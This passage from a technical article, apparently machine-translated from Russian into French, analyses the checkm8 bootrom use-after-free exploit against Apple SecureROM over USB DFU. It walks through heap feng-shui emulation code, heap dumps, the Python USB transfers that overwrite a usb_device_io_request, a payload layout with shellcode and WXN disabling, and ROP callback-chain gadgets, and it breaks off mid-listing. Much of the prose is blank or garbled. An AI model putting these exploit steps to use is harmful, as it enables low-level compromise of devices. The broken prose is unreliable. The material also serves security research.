src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  Le tas dans <code>SecureROM</code> con√ßu de telle mani√®re qu'une nouvelle zone de m√©moire est allou√©e √† partir d'un morceau libre appropri√© de la plus petite taille.  En cr√©ant un petit morceau libre par la m√©thode d√©crite ci-dessus, vous pouvez affecter l'allocation de m√©moire lors de l'initialisation <code>USB</code> et l'allocation de <code>io_buffer</code> et des requ√™tes. </p><br><p>  Pour une meilleure compr√©hension, voyons quelles demandes de <code>DFU</code> se produisent lors de l'initialisation de <code>DFU</code> .  Au cours de l'analyse du code source <code>iBoot</code> et de la r√©tro-ing√©nierie <code>iBoot</code> <code>SecureROM</code> nous avons r√©ussi √† obtenir la s√©quence suivante: </p><br><ul><li><ol><li>  Attribution de divers descripteurs de cha√Æne <br><ul><li>  1.1.  <code>Nonce</code> (taille <code>234</code> ) </li><li>  1.2.  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3.  <code>Product</code> ( <code>62</code> ) </li><li>  1.4.  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5.  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  Allocation associ√©e √† la cr√©ation de la t√¢che du <code>USB</code> <br><ul><li>  2.1.  Structure des t√¢ches ( <code>0x3c0</code> ) </li><li>  2.2.  T√¢che de pile ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li><ol><li>  Descripteurs de configuration <br><ul><li>  4.1.  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2.  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  Ensuite, il y a une allocation de structures de demande.  S'il y a un petit morceau au milieu de l'espace de tas, certaines allocations de la premi√®re cat√©gorie iront √† ce morceau, et toutes les autres allocations se d√©placeront, ce qui nous permettra de d√©border <code>usb_device_io_request</code> , en se r√©f√©rant √† l'ancien tampon.  Sch√©matiquement, cela peut √™tre repr√©sent√© comme suit: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  Pour calculer le biais n√©cessaire, nous avons d√©cid√© d'√©muler simplement les allocations r√©pertori√©es ci-dessus, en adaptant l√©g√®rement le code source du tas <code>iBoot</code> . </p><br><div class="spoiler">  <b class="spoiler_title">√âmulation de tas DFU</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); //        SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  Sortie du programme avec 8 requ√™tes au stade <code>heap feng-shui</code> : </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  La prochaine <code>usb_device_io_request</code> sera √† l'offset <code>0x5c0</code> rapport au d√©but de la m√©moire tampon pr√©c√©dente, ce qui correspond au code d'exploitation: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>       ,      <code>SecureRAM</code> ,      <code>checkm8</code> .     ,       .    ,    <code>usb_device_io_request</code>     ,       . </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): #    this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>         . ,        . </p><br><div class="spoiler"> <b class="spoiler_title">    SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p>     ,    <code>High Speed</code>  <code>Full Speed</code> ,     <code>IO</code> -.          , ,  ,      .      ,     . </p><br><h2 id="2-allokaciya-i-osvobozhdenie-io-bufera-bez-ochistki-globalnogo-sostoyaniya"> 2.    IO-     </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p>      <code>OUT</code> -   .      ,   <code>io_buffer</code>      .    <code>DFU</code>    <code>DFU_CLR_STATUS</code> ,      <code>DFU</code> . </p><br><h2 id="3-perezapis-usb_device_io_request-v-kuche-s-pomoschyu-use-after-free"> 3.  <code>usb_device_io_request</code>     <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>      <code>usb_device_io_request</code>        <code>t8010_overwrite</code> ,       . </p><br><p>  <code>t8010_nop_gadget</code>  <code>0x1800B0800</code>    <code>callback</code>  <code>next</code>  <code>usb_device_io_request</code> . </p><br><p> <code>t8010_nop_gadget</code>      ,         ,       <code>LR</code> , -    <code>free</code>  <code>callback</code> -  <code>usb_core_complete_endpoint_io</code> .  ,        ,          . </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code>   <code>INSECURE_MEMORY + 0x800</code> .  <code>INSECURE_MEMORY</code>     ,    <code>0x800</code>     <code>callback-chain</code> ,     . </p><br><h2 id="4-razmeschenie-poleznoy-nagruzki"> 4.    </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>            .      : </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode #  shell-code ... 0x1800B0180: t8010_handler #   usb- ... 0x1800B0400: 0x1000006a5 #     #  SecureROM (0x100000000 -&gt; 0x100000000) #        ... 0x1800B0600: 0x60000180000625 #     #  SecureRAM (0x180000000 -&gt; 0x180000000) #        0x1800B0608: 0x1800006a5 #     #    0x182000000  0x180000000 #           0x1800B0610: disabe_wxn_arm64 #    WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-ispolnenie-callback-chain"> 5.  <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>   <code>USB</code>     <code>usb_device_io_request</code>        .        ,       <code>callback</code> .       : </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18‚Üëj bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48‚Üëj bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p>  ,   <code>0x70</code>            .          <code>f(x)</code>   <code>f</code>  <code>x</code> . </p><br><p>      ,  <code>Unicorn Engine</code> .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p>      <code>iPhone 7</code>    . </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p>        .    ,          . </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p>  ,      ,    .   ,            ,   . </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p>         . </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: 